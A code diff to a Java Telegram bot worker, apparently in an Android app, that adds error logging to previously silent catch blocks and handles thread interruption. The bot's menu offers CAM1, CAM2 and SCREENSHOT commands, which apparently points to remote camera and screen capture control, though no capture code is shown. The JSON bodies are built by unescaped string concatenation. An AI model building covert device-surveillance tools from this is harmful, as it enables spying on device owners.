@@ -23,10 +23,18 @@ public class TelegramBotWorker implements Runnable {
         while (true) {
             try {
                 poll();
-            } catch (Exception e) {}
+            } catch (Exception e) {
+                ErrorLogger.logError(context, "TelegramBotWorker_RunLoop", e);
+            }
             try {
                 Thread.sleep(interval);
-            } catch (Exception e) {}
+            } catch (InterruptedException ie) {
+                // Thread was interrupted, probably on purpose. Exit the loop.
+                Thread.currentThread().interrupt();
+                break;
+            } catch (Exception e) {
+                ErrorLogger.logError(context, "TelegramBotWorker_Sleep", e);
+            }
         }
     }
 
@@ -76,7 +84,9 @@ public class TelegramBotWorker implements Runnable {
                     }
                 }
             }
-        } catch (Exception e) {}
+        } catch (Exception e) {
+            ErrorLogger.logError(context, "TelegramBotWorker_Poll", e);
+        }
     }
 
     private void handleMessage(JSONObject msg) {
@@ -86,7 +96,9 @@ public class TelegramBotWorker implements Runnable {
             if (text.equalsIgnoreCase("/command")) {
                 sendMenu(chatId);
             }
-        } catch (Exception e) {}
+        } catch (Exception e) {
+            ErrorLogger.logError(context, "TelegramBotWorker_HandleMessage", e);
+        }
     }
 
     private void sendMenu(long chatId) {
@@ -95,7 +107,9 @@ public class TelegramBotWorker implements Runnable {
             String urlStr = "https://api.telegram.org/bot" + token + "/sendMessage";
             String body = "{\"chat_id\":" + chatId + ",\"text\":\"Choose Command\",\"reply_markup\":{\"inline_keyboard\":[[{\"text\":\"CAM1\",\"callback_data\":\"CAM1\"},{\"text\":\"CAM2\",\"callback_data\":\"CAM2\"}], [{\"text\":\"SCREENSHOT\",\"callback_data\":\"SCREENSHOT\"}] ]}}";
             post(urlStr, body);
-        } catch (Exception e) {}
+        } catch (Exception e) {
+            ErrorLogger.logError(context, "TelegramBotWorker_SendMenu", e);
+        }
     }
 
     private void handleCallback(JSONObject cb) {
@@ -107,10 +121,12 @@ public class TelegramBotWorker implements Runnable {
             String msg = "Clicked: " + data;
             String body = "{\"chat_id\":" + chatId + ",\"text\":\"" + msg + "\"}";
             post(urlStr, body);
-        } catch (Exception e) {}
+        } catch (Exception e) {
+            ErrorLogger.logError(context, "TelegramBotWorker_HandleCallback", e);
+        }
     }
 
-    public static void post(String urlStr, String jsonBody) {
+    public void post(String urlStr, String jsonBody) {
         try {
             URL url = new URL(urlStr);
             HttpURLConnection conn = (HttpURLConnection) url.openConnection();
@@ -125,6 +141,8 @@ public class TelegramBotWorker implements Runnable {
             os.close();
             conn.getInputStream().close();
             conn.disconnect();
-        } catch (Exception e) {}
+        } catch (Exception e) {
+            ErrorLogger.logError(context, "TelegramBotWorker_Post", e);
+        }
     }
 }
